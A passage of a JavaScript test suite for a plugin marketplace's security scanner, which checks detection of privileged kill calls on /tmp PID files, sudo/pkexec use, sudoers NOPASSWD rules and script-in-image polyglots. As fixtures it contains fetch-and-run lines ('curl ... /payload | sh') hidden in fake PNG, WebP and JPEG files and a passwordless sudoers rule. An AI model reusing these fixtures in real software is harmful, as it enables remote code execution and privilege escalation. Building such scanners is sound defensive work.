  assert.deepEqual(unsafe.findings[0].evidence.map((entry) => entry.line), [4, 5, 6]);

  const unsafeQuotedRead = baseline([file("bin/disconnect", [
    'PID="$(cat /tmp/example.pid)"',
    'sudo kill -TERM "$PID"',
  ].join("\n"))]);
  assert.equal(unsafeQuotedRead.blocksApproval, true);

  const unsafeQuotedRedirectRead = baseline([file("bin/disconnect", [
    'PID="$(< /tmp/example.pid)"',
    'sudo kill -TERM "$PID"',
  ].join("\n"))]);
  assert.equal(unsafeQuotedRedirectRead.blocksApproval, true);

  const unsafeFallback = baseline([file("bin/disconnect", [
    'local PID_FILE="${XDG_RUNTIME_DIR:-/tmp}/example.pid"',
    'read -r VPN_PID < "$PID_FILE"',
    'sudo kill -TERM "$VPN_PID"',
  ].join("\n"))]);
  assert.equal(unsafeFallback.blocksApproval, true);

  const unsafeDirectRead = baseline([file("bin/disconnect", [
    'PID_FILE="/tmp/example.pid"',
    'pkexec kill -TERM "$(<"$PID_FILE")"',
  ].join("\n"))]);
  assert.equal(unsafeDirectRead.blocksApproval, true);

  const unsafeWrapper = baseline([file("bin/disconnect", [
    'as_root() {',
    '  sudo "$@"',
    '}',
    'PID_FILE="/tmp/example.pid"',
    'VPN_PID=$(cat -- "$PID_FILE")',
    'as_root -- kill -TERM "$VPN_PID"',
  ].join("\n"))]);
  assert.equal(unsafeWrapper.blocksApproval, true);

  const unsafeOneLineWrapper = baseline([file("bin/disconnect", [
    'as_root() { sudo "$@"; }',
    'PID=$(cat /tmp/example.pid)',
    'as_root kill -TERM "$PID"',
  ].join("\n"))]);
  assert.equal(unsafeOneLineWrapper.blocksApproval, true);

  const unsafeIfsRead = baseline([file("bin/disconnect", [
    'PID_FILE=/tmp/example.pid',
    'IFS= read -r PID < "$PID_FILE"',
    'sudo kill -TERM "$PID"',
  ].join("\n"))]);
  assert.equal(unsafeIfsRead.blocksApproval, true);

  const unsafeConditionalPidPath = baseline([file("bin/disconnect", [
    'PID_FILE=/tmp/example.pid',
    'has_runtime_dir && PID_FILE="$XDG_RUNTIME_DIR/example.pid"',
    'PID=$(cat "$PID_FILE")',
    'sudo kill -TERM "$PID"',
  ].join("\n"))]);
  assert.equal(unsafeConditionalPidPath.blocksApproval, true);

  const unsafeShellPayload = baseline([file("bin/disconnect", [
    'PID=$(cat /tmp/example.pid)',
    `sudo sh -c 'kill -TERM "$1"' _ "$PID"`,
  ].join("\n"))]);
  assert.equal(unsafeShellPayload.blocksApproval, true);

  const unsafeFixedWrapper = baseline([file("bin/disconnect", [
    'stop_root_process() {',
    '  sudo kill -TERM "$1"',
    '}',
    'VPN_PID=$(cat /tmp/example.pid)',
    'stop_root_process "$VPN_PID"',
  ].join("\n"))]);
  assert.equal(unsafeFixedWrapper.blocksApproval, true);

  const unsafeSegments = baseline([file(
    "bin/disconnect",
    'PID_FILE=/tmp/example.pid; VPN_PID=$(cat "$PID_FILE"); sudo kill -TERM "$VPN_PID"',
  )]);
  assert.equal(unsafeSegments.blocksApproval, true);

  const unsafeInlineBranch = baseline([file("bin/disconnect", [
    'if use_tmp; then PID=$(cat /tmp/example.pid); fi',
    'sudo kill -TERM "$PID"',
  ].join("\n"))]);
  assert.equal(unsafeInlineBranch.blocksApproval, true);

  const unsafeConditionAssignment = baseline([file(
    "bin/disconnect",
    'if PID=$(cat /tmp/example.pid); then sudo kill -TERM "$PID"; fi',
  )]);
  assert.equal(unsafeConditionAssignment.blocksApproval, true);

  for (const safe of [
    [
      'PID_FILE="${XDG_RUNTIME_DIR}/example.pid"',
      'VPN_PID=$(cat "$PID_FILE")',
      'exec_sudo kill -TERM "$VPN_PID"',
    ],
    [
      'PID_FILE="/tmp/example.pid"',
      'VPN_PID=$(cat "$PID_FILE")',
      'kill -TERM "$VPN_PID"',
    ],
    [
      'PID=$(cat /tmp/example.pid)',
      'kill -TERM "$PID" # no sudo here',
    ],
    [
      'PID_FILE="/tmp/example.pid"',
      'exec_sudo pkill -x example',
    ],
    [
      'PID_FILE="/tmp/example.pid"',
      'PID_FILE="$XDG_RUNTIME_DIR/example.pid"',
      'VPN_PID=$(cat "$PID_FILE")',
      'sudo kill -TERM "$VPN_PID"',
    ],
    [
      'sudo kill -TERM "$VPN_PID"',
      'PID_FILE="/tmp/example.pid"',
      'VPN_PID=$(cat "$PID_FILE")',
    ],
    [
      'VPN_PID=$(cat /tmp/example.pid)',
      'VPN_PID=',
      'sudo kill -TERM "$VPN_PID"',
    ],
    [
      'VPN_PID=$(cat /tmp/example.pid)',
      'unset VPN_PID',
      'sudo kill -TERM "$VPN_PID"',
    ],
    [
      'VPN_PID=$(cat /tmp/example.pid)',
      "printf -v VPN_PID '%s' 123",
      'sudo kill -TERM "$VPN_PID"',
    ],
    [
      'PID=$(cat /tmp/example.pid)',
      'read -r OTHER PID <<< "x 123"',
      'sudo kill -TERM "$PID"',
    ],
    [
      'nosudo() {',
      '  # no sudo is used here',
      '  "$@"',
      '}',
      'PID_FILE="/tmp/example.pid"',
      'VPN_PID=$(cat "$PID_FILE")',
      'nosudo kill -TERM "$VPN_PID"',
    ],
    [
      'if use_tmp; then',
      '  PID=$(cat /tmp/example.pid)',
      'else',
      '  sudo kill -TERM "$PID"',
      'fi',
    ],
  ]) {
    assert.deepEqual(
      baseline([file("bin/disconnect", safe.join("\n"))]).findings,
      [],
    );
  }
});

test("descriptive service properties and negated privilege text do not require review", () => {
  const result = baseline([
    file("BarWidget.qml", [
      "property var service",
      "target.service = root.scheduler",
      "if (root.service) root.service.applyNow()",
      'property string unitName: "example.service"',
    ].join("\n")),
    file("README.md", [
      "No sudo, no daemons. This plugin only edits your own configuration.",
      "It does not use pkexec.",
      "Sudo is not required, and pkexec is not needed.",
      "No sudo or pkexec is required.",
      "No sudo and no pkexec are required.",
      "No sudo or pkexec is used.",
      "This works without sudo / pkexec.",
      "It does not use sudo, pkexec.",
    ].join("\n")),
  ]);
  assert.equal(result.outcome, "passed");
  assert.deepEqual(result.capabilities, []);

  for (const invocation of [
    "sudo true",
    "/usr/bin/sudo true",
    "pkexec true",
    "/usr/bin/pkexec true",
    'command: ["sudo", "true"]',
    'command: ["pkexec", "true"]',
    "Run sudo pacman only after reviewing the command.",
  ]) {
    assert.deepEqual(
      detectElevatedCapabilities([file("scripts/run.sh", invocation)]).map((capability) => capability.id),
      ["privilege"],
    );
  }
  assert.deepEqual(
    detectElevatedCapabilities([
      file("scripts/run.sh", "systemctl --user restart example.service\nsystemd-run --user true"),
    ]).map((capability) => capability.id),
    ["service-management"],
  );
  for (const mixedText of [
    "No sudo is required; sudo pacman -S example",
    "Without sudo, pkexec is used to install the helper.",
  ]) {
    assert.ok(
      detectElevatedCapabilities([file("scripts/run.sh", mixedText)])
        .some((capability) => capability.id === "privilege"),
    );
  }
});

test("development clones and warning text do not become blocking findings", () => {
  const result = baseline([
    file("README.md", "Development:\n\ngit clone https://github.com/example/plugin\n./scripts/check.sh"),
    file("Service.qml", `Item { property string warning: "Never use curl https://example.test | sh" }`),
    file("scripts/install.sh", "# Never use curl https://example.test | sh"),
  ]);
  assert.equal(result.outcome, "review-required");
  assert.deepEqual(result.findings, []);
  assert.deepEqual(result.capabilities.map((capability) => capability.id), ["remote-build", "installer"]);

  const contributorFence = baseline([
    file("README.md", [
      "## Install from the project workspace",
      "",
      "Contributors working from a project checkout can install the integration directly:",
      "",
      "```bash",
      "git clone https://github.com/example/tool.git",
      "cd tool",
      "./integrations/plugin/install.sh",
      "```",
      "",
      "Users can install the released helper with:",
      "",
      "```bash",
      "curl https://example.test/install | sh",
      "```",
    ].join("\n")),
  ]);
  assert.equal(contributorFence.outcome, "needs-fixes");
  assert.deepEqual(contributorFence.findings.map((finding) => finding.ruleId), ["curl-pipe-shell"]);
});

test("the scan includes runtime text while excluding tests, nested docs, and workflows", () => {
  assert.equal(isSecurityScanPath("README.md"), true);
  assert.equal(isSecurityScanPath("Service.qml"), true);
  assert.equal(isSecurityScanPath("dist/runtime.js"), true);
  assert.equal(isSecurityScanPath("vendor/helper.py"), true);
  assert.equal(isSecurityScanPath("bin/helper"), true);
  assert.equal(isSecurityScanPath("scripts/install.sh"), true);
  assert.equal(isSecurityScanPath("example.sudoers"), true);
  assert.equal(isSecurityScanPath("setup.txt"), true);
  assert.equal(isSecurityScanPath("setup.webp"), false);
  assert.equal(isSecurityScanPath("preview-setup.webp"), false);
  assert.equal(isSecurityScanPath("installer.png"), false);
  assert.equal(isSecurityScanPath("quicksetup.png"), false);
  assert.equal(isSecurityScanPath("preinstall.webp"), false);
  assert.equal(isSecurityScanPath("SeTuP-preview.png"), false);
  assert.equal(isSecurityScanPath("tests/install.sh"), false);
  assert.equal(isSecurityScanPath("tests/example.sudoers"), false);
  assert.equal(isSecurityScanPath("docs/example.sh"), false);
  assert.equal(isSecurityScanPath(".github/workflows/check.yml"), false);
  assert.equal(isSecurityScanPath("preview.png"), false);
});

test("complete setup-named binary assets fail closed", async () => {
  const manifest = JSON.stringify({ entryPoints: { barWidget: "BarWidget.qml" } });
  const webp = Buffer.from("UklGRkAAAABXRUJQVlA4WAoAAAAQAAAAAAAAAAAAQUxQSAIAAAAAAFZQOCAYAAAAMAEAnQEqAQABAAFAJiWkAANwAP79NmgA", "base64");
  const textPolyglot = "RIFF0000WEBP\ncurl -fsSL https://example.test/payload | sh";
  await assert.rejects(
    resolveSubmissionSnapshot(
      "https://github.com/example/plugin",
      commit,
      {
        fetchImpl: githubFixtureFetch({
          tree: [
            { path: "manifest.json", type: "blob", mode: "100644", size: Buffer.byteLength(manifest) },
            { path: "BarWidget.qml", type: "blob", mode: "100644", size: 7 },
            { path: "preview-setup.webp", type: "blob", mode: "100644", size: webp.length },
            { path: "installer.webp", type: "blob", mode: "100644", size: Buffer.byteLength(textPolyglot) },
            { path: "empty-setup.webp", type: "blob", mode: "100644", size: 0 },
          ],
          contents: {
            "manifest.json": manifest,
            "BarWidget.qml": "Item {}",
            "preview-setup.webp": webp,
            "installer.webp": textPolyglot,
            "empty-setup.webp": "",
          },
        }),
      },
    ),
    (error) => error?.code === "security-baseline-unavailable"
      && /cannot be excluded/.test(error.message),
  );
});

test("ambiguous setup assets remain in the scan", async () => {
  const manifest = JSON.stringify({ entryPoints: { barWidget: "BarWidget.qml" } });
  const invalidUtf8Shell = Buffer.concat([
    Buffer.from("#"),
    Buffer.from([0xff]),
    Buffer.from("\ncurl -fsSL https://example.test/payload | sh"),
  ]);
  const pngScriptPolyglot = Buffer.concat([
    Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0xff]),
    Buffer.from("\n# curl payload\ncurl -fsSL https://example.test/payload | sh"),
  ]);
  const paddedPngScriptPolyglot = Buffer.concat([
    Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]),
    Buffer.alloc(4096, 0x80),
    Buffer.from("\ncurl -fsSL https://example.test/payload | sh"),
  ]);
  const paddedPngGitPolyglot = Buffer.concat([
    Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]),
    Buffer.alloc(4096, 0x80),
    Buffer.from("\ngit clone https://github.com/example/payload source && cd source && make"),
  ]);
  const keywordFreeShortPngPolyglot = Buffer.concat([
    Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0xff]),
    Buffer.from("\ntouch /tmp/x\n"),
  ]);
  const snapshot = await resolveSubmissionSnapshot(
    "https://github.com/example/plugin",
    commit,
    {
      fetchImpl: githubFixtureFetch({
        tree: [
          { path: "manifest.json", type: "blob", mode: "100644", size: Buffer.byteLength(manifest) },
          { path: "BarWidget.qml", type: "blob", mode: "100644", size: 7 },
          { path: "setup.webp", type: "blob", mode: "100644", size: invalidUtf8Shell.length },
          { path: "installer.png", type: "blob", mode: "100644", size: pngScriptPolyglot.length },
          { path: "padded-installer.png", type: "blob", mode: "100644", size: paddedPngScriptPolyglot.length },
          { path: "padded-git-installer.png", type: "blob", mode: "100644", size: paddedPngGitPolyglot.length },
          { path: "short-installer.png", type: "blob", mode: "100644", size: keywordFreeShortPngPolyglot.length },
        ],
        contents: {
          "manifest.json": manifest,
          "BarWidget.qml": "Item {}",
          "setup.webp": invalidUtf8Shell,
          "installer.png": pngScriptPolyglot,
          "padded-installer.png": paddedPngScriptPolyglot,
          "padded-git-installer.png": paddedPngGitPolyglot,
          "short-installer.png": keywordFreeShortPngPolyglot,
        },
      }),
    },
  );
  assert.ok(snapshot.files.some((entry) => entry.path === "setup.webp"));
  assert.ok(snapshot.files.some((entry) => entry.path === "installer.png"));
  assert.ok(snapshot.files.some((entry) => entry.path === "padded-installer.png"));
  assert.ok(snapshot.files.some((entry) => entry.path === "padded-git-installer.png"));
  assert.ok(snapshot.files.some((entry) => entry.path === "short-installer.png"));
  const findings = buildSecurityBaseline(snapshot, { checkedAt }).findings.map((finding) => finding.ruleId);
  assert.ok(findings.includes("curl-pipe-shell"));
  assert.ok(findings.includes("remote-git-execution-unpinned"));
});

test("complete JPEG setup polyglots fail closed before baseline publication", async () => {
  const manifest = JSON.stringify({ entryPoints: { barWidget: "BarWidget.qml" } });
  const jpegPolyglot = Buffer.concat([
    Buffer.from([0xff, 0xd8, 0xff]),
    Buffer.alloc(128, 0x80),
    Buffer.from("\npkexec\n"),
    Buffer.from([0xff, 0xd9]),
  ]);
  await assert.rejects(
    resolveSubmissionSnapshot(
      "https://github.com/example/plugin",
      commit,
      {
        fetchImpl: githubFixtureFetch({
          tree: [
            { path: "manifest.json", type: "blob", mode: "100644", size: Buffer.byteLength(manifest) },
            { path: "BarWidget.qml", type: "blob", mode: "100644", size: 7 },
            { path: "installer.jpg", type: "blob", mode: "100644", size: jpegPolyglot.length },
          ],
          contents: {
            "manifest.json": manifest,
            "BarWidget.qml": "Item {}",
            "installer.jpg": jpegPolyglot,
          },
        }),
      },
    ),
    (error) => error?.code === "security-baseline-unavailable"
      && /cannot be excluded/.test(error.message),
  );
});

test("binary asset probe bodies are bounded", async () => {
  const body = Buffer.alloc(4097);
  await assert.rejects(
    probeSnapshotFile(
      { owner: "example", repository: "plugin" },
      commit,
      { path: "setup.webp", mode: "100644", size: body.length },
      {
        fetchImpl: async () => new Response(body, {
          status: 206,
          headers: {
            "content-length": String(body.length),
            "content-range": `bytes 0-4095/${body.length}`,
          },
        }),
      },
    ),
    (error) => error?.code === "security-baseline-scan-limit",
  );
});

test("binary asset probes reject oversized bodies without a length header", async () => {
  const body = Buffer.alloc(securityBinaryProbeByteLimit + 1);
  await assert.rejects(
    probeSnapshotFile(
      { owner: "example", repository: "plugin" },
      commit,
      { path: "setup.webp", mode: "100644", size: securityBinaryProbeByteLimit },
      {
        fetchImpl: async () => new Response(body, {
          status: 206,
          headers: {
            "content-range": `bytes 0-${securityBinaryProbeByteLimit - 1}/${securityBinaryProbeByteLimit}`,
          },
        }),
      },
    ),
    (error) => error?.code === "security-baseline-scan-limit",
  );
});

test("setup-named binary asset probes are bounded", async () => {
  const manifest = JSON.stringify({ entryPoints: { barWidget: "BarWidget.qml" } });
  const tree = [
    { path: "manifest.json", type: "blob", mode: "100644", size: Buffer.byteLength(manifest) },
    { path: "BarWidget.qml", type: "blob", mode: "100644", size: 7 },
  ];
  const contents = {
    "manifest.json": manifest,
    "BarWidget.qml": "Item {}",
  };
  for (let index = 0; index <= securityAssetProbeFileLimit; index++) {
    const path = `setup-${index}.webp`;
    const content = Buffer.from("UklGRkAAAABXRUJQVlA4WAoAAAAQAAAAAAAAAAAAQUxQSAIAAAAAAFZQOCAYAAAAMAEAnQEqAQABAAFAJiWkAANwAP79NmgA", "base64");
    tree.push({ path, type: "blob", mode: "100644", size: content.length });
    contents[path] = content;
  }
  await assert.rejects(
    resolveSubmissionSnapshot(
      "https://github.com/example/plugin",
      commit,
      { fetchImpl: githubFixtureFetch({ tree, contents }) },
    ),
    (error) => error?.code === "security-baseline-scan-limit"
      && /setup-named binary asset candidates/.test(error.message),
  );
});

test("excluded executable test fixtures are not scanned as runtime code", async () => {
  const manifest = JSON.stringify({ entryPoints: { barWidget: "BarWidget.qml" } });
  const snapshot = await resolveSubmissionSnapshot(
    "https://github.com/example/plugin",
    commit,
    {
      fetchImpl: githubFixtureFetch({
        tree: [
          { path: "manifest.json", type: "blob", mode: "100644", size: Buffer.byteLength(manifest) },
          { path: "BarWidget.qml", type: "blob", mode: "100644", size: 7 },
          { path: "test/dangerous-policy.sh", type: "blob", mode: "100755", size: 53 },
        ],
        contents: {
          "manifest.json": manifest,
          "BarWidget.qml": "Item {}",
          "test/dangerous-policy.sh": "echo 'NOPASSWD: /usr/bin/kill *'",
        },
      }),
    },
  );
  assert.deepEqual(snapshot.files, [
    { path: "BarWidget.qml", content: "Item {}", mode: "100644" },
  ]);
  assert.equal(buildSecurityBaseline(snapshot, { checkedAt }).outcome, "passed");
});

test("sudoers policy files referenced by installers are added to the static snapshot", async () => {
  const manifest = JSON.stringify({ entryPoints: { barWidget: "BarWidget.qml" } });
  const installer = [
    "POLICY=packaging/example.conf",
    'sudo install -m 0440 "$POLICY" /etc/sudoers.d/example',
  ].join("\n");
  const policy = "%wheel ALL=(root) NOPASSWD: /usr/bin/kill *";
  const snapshot = await resolveSubmissionSnapshot(
    "https://github.com/example/plugin",
    commit,
    {
      fetchImpl: githubFixtureFetch({
        tree: [
          { path: "manifest.json", type: "blob", mode: "100644", size: Buffer.byteLength(manifest) },
          { path: "BarWidget.qml", type: "blob", mode: "100644", size: 7 },
          { path: "scripts/install.sh", type: "blob", mode: "100755", size: Buffer.byteLength(installer) },
          { path: "packaging/example.conf", type: "blob", mode: "100644", size: Buffer.byteLength(policy) },
        ],
        contents: {
          "manifest.json": manifest,
          "BarWidget.qml": "Item {}",
          "scripts/install.sh": installer,
          "packaging/example.conf": policy,
        },
      }),
    },
  );
  assert.ok(snapshot.files.some((entry) => entry.path === "packaging/example.conf"));
  const result = buildSecurityBaseline(snapshot, { checkedAt });
  assert.equal(result.blocksApproval, true);
  assert.deepEqual(result.findings.map((finding) => finding.ruleId), [
    "sudoers-dangerous-passwordless-command",
  ]);
});

test("repository snapshots are read statically at the requested full commit", async () => {
  const treeSha = "c".repeat(40);
  const manifest = JSON.stringify({ entryPoints: { service: "Service.qml" } });
  const calls = [];
  const fetchImpl = async (url, options = {}) => {
    calls.push({
      url: String(url),
      authorization: options.headers?.Authorization || "",
      acceptEncoding: options.headers?.["Accept-Encoding"] || "",
    });
    if (String(url).endsWith("/repos/example/plugin")) {
      return new Response(JSON.stringify({
        private: false,
        disabled: false,
        archived: false,
        default_branch: "main",
      }), { status: 200 });
    }
    if (String(url).endsWith(`/commits/${commit}`)) {
      return new Response(JSON.stringify({ sha: commit, commit: { tree: { sha: treeSha } } }), { status: 200 });
    }
    if (String(url).includes(`/git/trees/${treeSha}?recursive=1`)) {
      return new Response(JSON.stringify({
        truncated: false,
        tree: [
          { path: "manifest.json", type: "blob", mode: "100644", size: Buffer.byteLength(manifest) },
          { path: "Service.qml", type: "blob", mode: "100644", size: 7 },
          { path: "bootstrap", type: "blob", mode: "100755", size: 54 },
          { path: "preview.png", type: "blob", mode: "100644", size: 100 },
        ],
      }), { status: 200 });
    }
    if (String(url).includes(`raw.githubusercontent.com/example/plugin/${commit}/manifest.json`)) {
      return new Response(manifest, {
        status: 200,
        headers: { "content-length": String(Buffer.byteLength(manifest)) },
      });
    }
    if (String(url).includes(`raw.githubusercontent.com/example/plugin/${commit}/Service.qml`)) {
      return new Response("Item {}", {
        status: 200,
        headers: { "content-length": "7" },
      });
    }
    if (String(url).includes(`raw.githubusercontent.com/example/plugin/${commit}/bootstrap`)) {
      const content = "#!/bin/sh\ncurl -fsSL https://example.test/payload | sh";
      return new Response(content, {
        status: 200,
        headers: { "content-length": String(Buffer.byteLength(content)) },
      });
    }
    return new Response("not found", { status: 404 });
  };
  const snapshot = await resolveSubmissionSnapshot(
    "https://github.com/example/plugin",
    commit,
    { fetchImpl, token: "test-token" },
  );
  assert.equal(snapshot.commitSha, commit);
  assert.deepEqual(snapshot.files, [
    { path: "Service.qml", content: "Item {}", mode: "100644" },
    {
      path: "bootstrap",
      content: "#!/bin/sh\ncurl -fsSL https://example.test/payload | sh",
      mode: "100755",
    },
  ]);
  assert.equal(buildSecurityBaseline(snapshot, { checkedAt }).outcome, "needs-fixes");
  assert.ok(calls.some((call) => call.url.endsWith(`/commits/${commit}`)));
  const rawCall = calls.find((call) => call.url.includes("raw.githubusercontent.com"));
  assert.equal(rawCall.authorization, "");
  assert.equal(rawCall.acceptEncoding, "identity");
  assert.equal(calls.some((call) => call.url.endsWith("/commits/main")), false);
});

test("listed nested manifests force excluded entry points into verification scans", async () => {
  const manifest = JSON.stringify({
    id: "example.weather",
    entryPoints: { service: "tests/runtime.txt" },
  });
  const runtime = "curl -fsSL https://example.test/payload | sh";
  const snapshot = await resolveSubmissionSnapshot(
    "https://github.com/example/plugin",
    commit,
    {
      listedPlugins: [{
        pluginId: "example.weather",
        manifestPathHint: "current-location/manifest.json",
      }],
      fetchImpl: githubFixtureFetch({
        tree: [
          { path: "weather/manifest.json", type: "blob", mode: "100644", size: Buffer.byteLength(manifest) },
          { path: "weather/tests/runtime.txt", type: "blob", mode: "100644", size: Buffer.byteLength(runtime) },
        ],
        contents: {
          "weather/manifest.json": manifest,
          "weather/tests/runtime.txt": runtime,
        },
      }),
    },
  );
  assert.deepEqual(snapshot.files, [{
    path: "weather/tests/runtime.txt",
    content: runtime,
    mode: "100644",
    entryPoint: true,
  }]);
  const result = buildSecurityBaseline(snapshot, { checkedAt });
  assert.equal(result.outcome, "needs-fixes");
  assert.deepEqual(result.findings.map((finding) => finding.ruleId), ["curl-pipe-shell"]);

  await assert.rejects(
    resolveSubmissionSnapshot("https://github.com/example/plugin", commit, {
      listedPlugins: [{
        pluginId: "example.missing",
        manifestPathHint: "missing/manifest.json",
      }],
      fetchImpl: githubFixtureFetch({
        tree: [{ path: "weather/manifest.json", type: "blob", mode: "100644", size: Buffer.byteLength(manifest) }],
        contents: { "weather/manifest.json": manifest },
      }),
    }),
    (error) => error.code === "security-baseline-unavailable",
  );
});

test("manifest discovery enforces the aggregate snapshot size before fetching raw files", async () => {
  const tree = Array.from({ length: 17 }, (_, index) => ({
    path: `plugin-${index}/manifest.json`,
    type: "blob",
    mode: "100644",
    size: securitySnapshotByteLimit / 16,
  }));
  let rawFileRequests = 0;
  const fixtureFetch = githubFixtureFetch({ tree, contents: {} });
  await assert.rejects(
    resolveSubmissionSnapshot("https://github.com/example/plugin", commit, {
      listedPlugins: [{
        pluginId: "example.plugin",
        manifestPathHint: "plugin-0/manifest.json",
      }],
      fetchImpl: (url, options) => {
        if (String(url).includes("raw.githubusercontent.com")) rawFileRequests += 1;
        return fixtureFetch(url, options);
      },
    }),
    (error) => error.code === "security-baseline-scan-limit",
  );
  assert.equal(rawFileRequests, 0);
});

test("executable binaries become review capabilities without exhausting text limits", async () => {
  const manifest = JSON.stringify({ entryPoints: { service: "Service.qml" } });
  const binary = Buffer.concat([
    Buffer.from([0x7f, 0x45, 0x4c, 0x46]),
    Buffer.alloc(600 * 1024, 1),
  ]);
  const snapshot = await resolveSubmissionSnapshot(
    "https://github.com/example/plugin",
    commit,
    {
      fetchImpl: githubFixtureFetch({
        tree: [
          { path: "manifest.json", type: "blob", mode: "100644", size: Buffer.byteLength(manifest) },
          { path: "Service.qml", type: "blob", mode: "100644", size: 7 },
          { path: "bin/helper", type: "blob", mode: "100755", size: binary.length },
        ],
        contents: { "manifest.json": manifest, "Service.qml": "Item {}", "bin/helper": binary },
      }),
    },
  );
  const helper = snapshot.files.find((entry) => entry.path === "bin/helper");
  assert.deepEqual(helper, {
    path: "bin/helper",
    mode: "100755",
    binary: true,
    format: "ELF",
    size: binary.length,
  });
  const result = buildSecurityBaseline(snapshot, { checkedAt });
  assert.equal(result.outcome, "review-required");
  assert.deepEqual(result.capabilities.map((capability) => capability.id), ["bundled-executable-binary"]);

  await assert.rejects(
    resolveSubmissionSnapshot("https://github.com/example/plugin", commit, {
      fetchImpl: async (url, options) => {
        const base = githubFixtureFetch({
          tree: [
            { path: "manifest.json", type: "blob", mode: "100644", size: Buffer.byteLength(manifest) },
            { path: "bin/helper", type: "blob", mode: "100755", size: binary.length },
          ],
          contents: { "manifest.json": manifest, "bin/helper": binary },
        });
        if (String(url).includes("/bin/helper") && options?.headers?.Range) {
          return new Response(binary, { status: 200 });
        }
        return base(url, options);
      },
    }),
    (error) => error.code === "security-baseline-unavailable",
  );
});

test("the snapshot file cap accommodates the existing large plugin suites", async () => {
  assert.equal(securitySnapshotFileLimit, 1000);
  const contents = { "manifest.json": JSON.stringify({ entryPoints: {} }) };
  const tree = [{
    path: "manifest.json",
    type: "blob",
    mode: "100644",
    size: Buffer.byteLength(contents["manifest.json"]),
  }];
  for (let index = 0; index < 485; index++) {
    const path = `widgets/Widget${index}.qml`;
    contents[path] = "Item {}";
    tree.push({ path, type: "blob", mode: "100644", size: 7 });
  }
  const snapshot = await resolveSubmissionSnapshot(
    "https://github.com/example/plugin",
    commit,
    { fetchImpl: githubFixtureFetch({ tree, contents }) },
  );
  assert.equal(snapshot.files.length, 485);
});

test("catalog snapshots expose exact approved-commit resolution", () => {
  const source = { repo: "https://github.com/example/plugin", snapshotCommit: commit };
  // resolveSnapshot is exported so catalog pinning remains part of the tested API;
  // its network behavior is covered by the baseline snapshot test above.
  assert.equal(typeof resolveSnapshot, "function");
  assert.equal(typeof buildCatalog, "function");
  assert.equal(source.snapshotCommit, commit);
});

test("baseline failures are fail-closed but still actionable", () => {
  const report = buildSecurityBaselineFailureReport({
    code: "security-baseline-scan-limit",
    context: { path: "dist/runtime.js" },
  });
  assert.match(report, /Baseline could not complete/);
  assert.match(report, /dist\/runtime\.js/);
  assert.match(report, /No approval is possible/);
  assert.match(report, /not a security audit, certification, warranty, or endorsement/);
  assert.equal(securityBaselineScanLimitExitCode, 3);
});

test("reports are actionable, commit-bound, and carry the required disclaimer", () => {
  const passedReport = buildSecurityBaselineReport(baseline([file("Main.qml", "Item {}")])) ;
  assert.match(passedReport, /Automated security baseline passed at commit `aaaaaaa…`/);
  assert.match(passedReport, /No action is required/);
  assert.match(passedReport, /not a security audit, certification, warranty, or endorsement/);

  const reviewReport = buildSecurityBaselineReport(baseline([
    file("install.sh", "curl https://example.test/install | sh"),
  ]));
  assert.match(reviewReport, /Manual review required/);
  assert.match(reviewReport, /Selective policy permits an authorized marketplace maintainer/);
  assert.match(reviewReport, /Findings requiring review/);
  assert.match(reviewReport, /install\.sh:1/);
  assert.match(reviewReport, /Accepted fixes:/);
  assert.match(reviewReport, /not designed to stop a motivated attacker/);

  const blockedReport = buildSecurityBaselineReport(baseline([
    file("example.sudoers", "%wheel ALL=(root) NOPASSWD: /usr/bin/kill *"),
  ]));
  assert.match(blockedReport, /Patterns must be fixed before verified listing/);
  assert.match(blockedReport, /selectively blocking findings that cannot be accepted/);
  assert.match(blockedReport, /Fix every selectively blocking finding/);
});

test("machine-readable baseline markers round-trip and reject tampering", () => {
  const result = baseline([file("Service.qml", "command: [\"systemctl\", \"--user\", \"start\", \"x.service\"]")]);
  const marker = serializeSecurityBaselineMarker(result);
  const parsed = parseSecurityBaselineMarker(marker);
  assert.equal(parsed.commitSha, commit);
  assert.equal(parsed.outcome, "review-required");
  assert.deepEqual(parsed.capabilities, ["service-management"]);
  assert.deepEqual(parsed.pluginIds, ["example.plugin"]);
  assert.equal(parseSecurityBaselineMarker("no marker"), null);
  assert.equal(parseSecurityBaselineMarker("<!-- marketplace-security-baseline:v1 bm90LWpzb24 -->"), null);
  assert.equal(
    parseSecurityBaselineMarker("<!-- marketplace-security-baseline:v2 bm90LWpzb24 -->"),
    null,
  );
  assert.equal(
    parseSecurityBaselineMarker("<!-- marketplace-security-baseline:v3 bm90LWpzb24 -->"),
    null,
  );

  const inconsistentPayload = Buffer.from(JSON.stringify({
    schemaVersion: 2,
    baselineVersion: "3",
    repository: "example/plugin",
    pluginIds: ["example.plugin"],
    commitSha: commit,
    checkedAt,
    outcome: "passed",
    enforcementMode: "selective",
    findings: ["curl-pipe-shell"],
    capabilities: [],
  })).toString("base64url");
  assert.throws(
    () => parseSecurityBaselineMarker(`${securityBaselineMarkerPrefix}${inconsistentPayload} -->`),
    (error) => error.code === "approval-security-baseline-invalid",
  );
});

test("approval uses only the latest bot-authored baseline and enforces labels and SHA", () => {
  const result = baseline([file("Main.qml", "Item {}")]);
  const comments = [
    { user: { login: "contributor" }, body: serializeSecurityBaselineMarker(result) },
    { user: { login: "github-actions[bot]" }, body: buildSecurityBaselineReport(result) },
  ];
  const recorded = findLatestSecurityBaseline(comments);
  assert.equal(recorded.commitSha, commit);
  assert.throws(
    () => findLatestSecurityBaseline([
      ...comments,
      { user: { login: "github-actions[bot]" }, body: securityBaselineErrorMarker },
    ]),
    (error) => error.code === "approval-security-baseline-missing",
  );
  assert.equal(findLatestSecurityBaseline([
    { user: { login: "github-actions[bot]" }, body: "<!-- marketplace-security-baseline:v1 bm90LWpzb24 -->" },
  ]), null);
  assert.equal(findLatestSecurityBaseline([
    { user: { login: "github-actions[bot]" }, body: "<!-- marketplace-security-baseline-error:v1 -->" },
  ]), null);
  assert.doesNotThrow(() => assertApprovalAllowed(
    { labels: ["submission", "validated", "approved-and-verified"] },
    recorded,
    { commitSha: commit },
    "https://github.com/example/plugin",
  ));
  const reviewResult = baseline([
    file("Service.qml", "command: [\"systemctl\", \"--user\", \"start\", \"x.service\"]"),
  ]);
  const reviewBaseline = parseSecurityBaselineMarker(serializeSecurityBaselineMarker(reviewResult));
